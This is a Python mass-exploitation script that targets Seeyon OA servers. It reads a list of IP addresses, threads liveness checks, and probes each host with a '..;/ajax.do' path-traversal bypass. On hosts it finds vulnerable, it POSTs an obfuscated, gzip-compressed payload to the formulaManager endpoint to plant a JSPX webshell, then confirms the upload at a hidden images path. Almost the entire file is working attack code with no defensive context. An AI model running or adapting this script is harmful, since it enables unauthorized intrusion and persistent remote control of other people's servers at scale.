
from os import linesep
import threading
import time
from threading import *
import requests
import re

list_data=[]
online_url = []
vuln_url=[]
t_lock = threading.Semaphore(value=1)
header = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3298.4 Safari/537.36'
}

def poc_a(url):
    
    session = requests.session()
    target_url = url + "/seeyon/thirdpartyController.do.css/..;/ajax.do"

    try: 
        res = requests.get(target_url,headers=header,timeout=3)
        pattern = re.compile('异常')
        cache = re.findall(pattern,res.text)
        if cache:
            vuln_url.append(url)
    except Exception as e:
        pass

def poc_b(url):

    try:
        session = requests.session()

        headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36",
            "Content-Type": "application/x-www-form-urlencoded",
        }

        data = "managerMethod=validate&arguments=%1F%C2%8B%08%00%00%00%00%00%00%03uTY%C2%93%C2%A2H%10%7E%C3%9E%C3%BD%15%C2%84%2F%C3%9A%C3%9136%C2%82%C2%8C%C3%ADN%C3%ACC%7B%21%C2%A2%C2%A8%C2%A0%5C%1B%C3%BB%00U%C3%88a%15%C2%B0rH%C3%991%C3%BF%7D%0B%C2%B0%C2%A7%7Bb%7B%C3%AB%C2%A52%C2%B32%C2%BF%C3%8A%C3%BB%C2%AF%C3%97%C3%AE%29%C2%B9%C3%A0%029%07%C2%92z%C3%9D%3F%C2%98%C3%81%17%C3%A6M%C2%A28%C2%B8%C2%96ts%2F%C3%8B%C2%BB%C3%AF%C3%A2y%C2%95%5E%C2%BC%2C%0B%C2%93%C2%B8%7E%C3%94%C3%B2K%18%C3%BBL%C3%AA%C3%A4%01%C3%B3%27%C3%93%C3%A9%C3%B7%C2%9F%C2%AE%C2%9E%C3%AB%C2%A4i%C3%B6%C2%94y%1EI%C3%A2%C2%A7%C3%8E%C3%B7%C3%9F%C2%99%C3%B6%C3%BC%169%C2%A5%C3%93%0F%C2%93%C3%BE%C2%8E%C2%9A%C3%A4%C3%86%25%C3%8C%C2%BD%0B%C2%93%C2%BE%C3%93%1C%05%C2%88%C2%BD%2B%C3%B3%C2%89Z%C2%AF%C3%86%7F%C3%AC%C3%94%C2%9E%C3%B4%C2%A3%2C%C2%AD%3A%0F%3FQ%C2%99%C2%BB%07Y%C3%A0%21T%C2%BB%C2%B0%13%C3%93%1B%C2%98%C2%A5%C3%84%C3%A5%C3%86%C2%AC%C2%B4%0CrW%14n%5B%5C%C3%8B%C3%98%C3%90Y%C2%AA%2C%C2%98%25%C3%A5%C2%9AK%03%C2%88%C3%A7%05%C3%A0%C3%B5b%C2%8D%C2%95%C3%92%C3%95%C3%86%C3%B2q%C3%B0R%1E%C3%85Elk%C2%92%0F%C2%B1N%00%C2%87J7b%C3%83%C2%8D6%24R4%7Cvb%C3%A5%C2%BA%C3%85j%0A%C2%B0%1EA%11q%C2%B6%26%5C-%03%22ID9%10%C3%87%04%C3%96%C3%B8x%C3%81Y%C2%9A0%C2%A0%C3%AF%C3%99%3AL%C2%B2%C2%867%C3%BD%C3%82%C3%A2W%02X%C2%AA%C3%A5%C2%A72%C2%8Ak%1B%C2%9BB%0E%C2%A5r%17U%C3%BF%00%C3%BE%C3%A5%C2%9B-%C3%AA%C2%91%2B.%C2%88e%C2%AA%C2%A9%C3%8B%0D%1F%25Q%C3%89%2CS%C2%B9I%C2%8B%C2%A3o%C2%9B%01k%1B%C3%82%19%C2%90%C3%89%C2%8C%C3%AA%C3%9C%00%5B%C2%95%C2%96%C2%A1%22%10%C3%A7%C2%BA%3Co%C3%B5%0E%C3%A28%C2%A0%18D%127%C2%A9%C3%87%2B%03%40i%C2%99%C3%92%5B%7Ep%C2%85%C3%86%2As%C2%8C%C2%8D%C2%BF%C3%A7%C2%AA%00%C3%B0%1B%C3%9F%26A%C3%A8%C2%99%2A%C2%92%169%C2%B4B4%C2%A2%C3%B1%C2%B1%C3%90%5C%15%C3%92%C2%B2%C2%B5%5Bc%15%C3%99%18%15%C3%B6%C2%B1%C3%85%C2%96E%29%C3%9BL%C2%ABp%C2%8D%2B%C3%A4b%C3%88%3A%C3%93%C3%B3%C3%A8d%C2%B2%C3%8F4%C2%A7u%C3%9E%C3%8F%C2%B6Q%C3%AB%C2%AD%02%C2%9A%03%C2%9A%C2%BF%7B%C3%9Eb%25%02%18%5D%C2%A1X%218%13%0Ep%C2%B9J%5D%0C%7C%C3%A7%C3%86%C2%86%C3%B6a%3F%C2%B0%0F%1B%C2%B25ldE%C3%BAy%7B%C2%90%06V%28%C2%8D%00%C2%A7%C3%9F%C2%9A%1A%C2%84%C3%82%15%C2%9A%C2%AAa%19%C3%95%C3%80%C3%96%C3%BC%10jR%C3%A6%C2%90%C3%B3h%C3%8F%C2%A1%C2%AB%C3%93%C3%868%7E%C2%A3%C3%97%18%228G%C2%B4%C2%AEj%C3%A0b%05%C3%89%C3%93%C3%95D%C3%957%C2%A1%7C%C3%88%C2%A35%C2%8D%C3%811%C3%B7%C3%89%26%C2%AC%0A%C3%9B%04%C3%BE%C2%91%C3%93%C2%A3%3AV%C2%8D%C3%93%C2%85%23%3FA%16%C3%B1%C2%93%0F%7F%C3%86%C3%B6%C2%AF%7F%C2%A62%C2%91BYk%C3%A4%C3%93%3A_%C2%80%C3%B8%C3%A9%C3%BA%0D_%3B%C2%8F%5C%C2%AC%C3%B3%C2%B4%3E%09%14%C2%83%14%C2%90F%C2%AF%C2%ADO%C2%AD%C3%97%C3%B8%C3%B5km%C3%A4%C3%A9%C2%99%C3%8AAb%11%C3%A1%C3%AC%C2%B26%C3%8D%C3%87%22%C2%93E%01A2%C2%B9AcX%C2%B8%06%C2%BA%C3%91%C2%B7%C3%A9%5EW%16J%C2%A4%C3%8Ei%5E%C3%8B%C2%BB%5D%C3%91%C3%B4%07%C2%A7%C2%A2%7D%C2%ACc%C2%9B%C3%B6%C2%AA%C2%BC%5C%21%60%C3%AA%08%C3%B0%C3%BB%C3%82%C3%A6t%C3%B6%C2%88%C3%B5%C2%B7%3F%0AP%C3%93th%5D%7CL%C2%A8%C2%9F%29%C2%8D%C2%81%C3%86%0FWn%C2%AC%C2%B0%C2%96%21D4%3E%C3%AA%C2%87%5EAc%C2%91%01%124%3D%C2%BD%C3%A7%C3%86%05%14%C3%B5%21%C2%A4%C2%B5%C3%9DM%C3%87MO%02N%21%C2%8E9a%5DQgw%C3%91%C2%B5l%C3%AB%C2%BA%2A%5D%7E%C3%BF%C3%B8%3E%C3%A4LV%C3%84%7D%1Cf%C2%A0%3Fy%C3%91%C3%A6%C3%9F%C2%863%0F%24%C2%90%C3%8E9%C2%BC%C3%9F%C3%AD%C2%88%7F%C2%AE%C3%94%C3%BB%C3%AFT%C2%B7fw%C2%A6%C2%B5m%C2%99%C3%9E%1D%C2%B0%C3%9F%C3%9E%C2%93%C3%A2t%C2%A2%00%C3%8D%12x%C3%B8%C3%929%1E%16_%C2%9F%3F.%C2%89%C2%8Fk%C2%A6%C3%9F0%28%C3%AE%7D%04%C3%BF%3F%5D%C2%80%C2%92%C3%8C%C2%A3%C2%8E%C3%BD%C3%B8%5E%2F%1FJ%40%C3%AF%C3%84d%C2%B9%C2%93%C2%87%C2%80%C2%A9%C2%AA%C2%AA%C3%B7%C3%B0%C3%9A%C3%BDAw%23%C3%9D%C2%8F%C2%AF%C3%B5%C2%9D_%0A%C2%AF%C3%BB%C3%B7%C2%BFN%C3%81%C3%B5%C2%ADV%05%00%00"
        vulnurl = url + "/seeyon/autoinstall.do.css/..;/ajax.do?method=ajaxAction&managerName=formulaManager&requestCompress=gzip"
        response = session.post(vulnurl,data=data,headers=headers,verify=False)
        test_shell(url)
        t_lock.acquire()
    except:
        t_lock.acquire()
        pass
    finally:
        t_lock.release()

def test_shell(url):
    webshell_url = url + "/seeyon/apps_res/addressbook/images/config.jspx"

    try:
        res = requests.get(webshell_url)
        if res.status_code == 200:
            print("[+] \033[34m目標 %s 成功上傳 \033[0m\n"%(webshell_url))
        else:
            print("[-] \033[31m目標 %s 漏洞無法利用，寫入失敗 \033[0m\n"%(webshell_url))

    except Exception as e:
        print("[-] \033[31m漏洞無法利用，寫入失敗 {}，URL={}\033[0m\n".format(e,url))

def list_req(url):
    
    try:
        session = requests.session()
        res = requests.get(url,headers=header,timeout=3)
        code = res.status_code
        if code == 200:
            online_url.append(url)

        t_lock.acquire()
    except Exception as e:
        pass
        t_lock.acquire()
        #print("[-] ERROR : %s\n"%(e))
    finally:
        t_lock.release()

def main():
    
    try: 
        with open('20210609-143239_ip.txt','r') as f:
            for line in f.read().splitlines():
                list_data.append(line)

        print("資料筆數:%d筆\n"%(len(list_data)))

        for url in list_data:
            h_url = "http://" + url
            t = Thread(target=list_req,args=(h_url,))
            t.start()
        t.join()
        time.sleep(3)
        print("[+] \033[34m存活主機: %d 台\033[0m\n"%(len(online_url)))

        for url in online_url:
            t = Thread(target=poc_a,args=(url,))
            t.start()
        t.join()
        time.sleep(3)
        print("[+] \033[36m可能存在漏洞URL: %d筆\033[0m\n"%(len(vuln_url)))

        for url in vuln_url:
            t= Thread(target=poc_b,args=(url,))
            t.start()

    except Exception as e:
        print("[-] ERROR : %s\n"%(e))

if __name__ == '__main__':
    main()